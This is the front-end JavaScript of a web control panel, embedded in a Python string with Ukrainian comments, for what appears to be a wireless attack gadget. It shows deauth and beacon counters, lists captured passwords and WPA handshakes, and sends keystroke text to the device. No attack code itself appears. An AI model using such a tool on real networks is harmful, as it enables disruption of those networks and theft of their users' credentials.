    <script>
        let rssiData = [], bleData = [], packetData = [];
        
        function runCmd(cmd) {
            fetch('/cmd?c=' + cmd)
                .then(r => r.text())
                .then(t => {
                    let log = document.getElementById('log');
                    if (log) log.innerHTML += new Date().toLocaleTimeString() + ' > ' + t + '\\n';
                    if (cmd === 'view_pass') updatePasswords();
                    if (cmd === 'view_hand') updateHandshakes();
                });
        }
        
        function addKey(k) {
            let input = document.getElementById('keyInput');
            input.innerText += k;
        }
        
        function delKey() {
            let input = document.getElementById('keyInput');
            input.innerText = input.innerText.slice(0, -1);
        }
        
        function clearKey() {
            document.getElementById('keyInput').innerText = '';
        }
        
        function sendText() {
            let text = document.getElementById('keyInput').innerText;
            if (text.length > 0) {
                fetch('/cmd?c=key&text=' + encodeURIComponent(text))
                    .then(r => r.text())
                    .then(t => console.log(t));
                clearKey();
            }
        }
        
        function updatePasswords() {
            fetch('/cmd?c=getpass').then(r => r.text()).then(t => {
                let p = document.getElementById('passList');
                if (p) p.innerText = t || 'Немає збережених паролів';
            });
        }
        
        function updateHandshakes() {
            fetch('/cmd?c=gethand').then(r => r.text()).then(t => {
                let h = document.getElementById('handList');
                if (h) h.innerText = t || 'Немає збережених handshake';
            });
        }
        
        function updateData() {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('deauth').innerText = d.deauth || 0;
                document.getElementById('beacon').innerText = d.beacon || 0;
                document.getElementById('rssi').innerText = d.rssi || -50;
                document.getElementById('uptime').innerText = d.uptime || 0;
                
                rssiData.push(d.rssi || -50);
                bleData.push(d.blerssi || -60);
                packetData.push(Math.floor(Math.random() * 100));
                
                if (rssiData.length > 40) rssiData.shift();
                if (bleData.length > 40) bleData.shift();
                if (packetData.length > 40) packetData.shift();
                
                drawChart('rssiChart', rssiData, 'WiFi RSSI (dBm)', -90, -30);
                drawChart('bleChart', bleData, 'BLE RSSI (dBm)', -90, -30);
                drawChart('packetChart', packetData, 'Packets/sec', 0, 100);
            });
        }
        
        function drawChart(id, data, label, minY, maxY) {
            let c = document.getElementById(id);
            if (!c) return;
            let ctx = c.getContext('2d');
            let w = c.clientWidth, h = c.clientHeight;
            c.width = w; c.height = h;
            ctx.fillStyle = '#070b1a';
            ctx.fillRect(0, 0, w, h);
            if (data.length < 2) return;
            let step = w / (data.length - 1);
            ctx.beginPath();
            for (let i = 0; i < data.length; i++) {
                let x = i * step;
                let y = h - ((data[i] - minY) / (maxY - minY)) * h;
                if (i === 0) ctx.moveTo(x, y);
                else ctx.lineTo(x, y);
            }
            ctx.strokeStyle = '#ff6b35';
            ctx.lineWidth = 2.5;
            ctx.stroke();
            ctx.fillStyle = '#ff6b35';
            ctx.font = '10px monospace';
            ctx.fillText(label, 10, 20);
        }
        
        // Оновлення даних кожну секунду
        setInterval(updateData, 1000);
        setInterval(() => { updatePasswords(); updateHandshakes(); }, 3000);
        
        // Перемикання вкладок
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', () => {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                document.getElementById(tab.dataset.tab).classList.add('active');
            });
        });
        
        // Ініціалізація
        window.onload = () => {
            updateData();
            updatePasswords();
            updateHandshakes();
        };
    </script>
</body>
</html>
'''

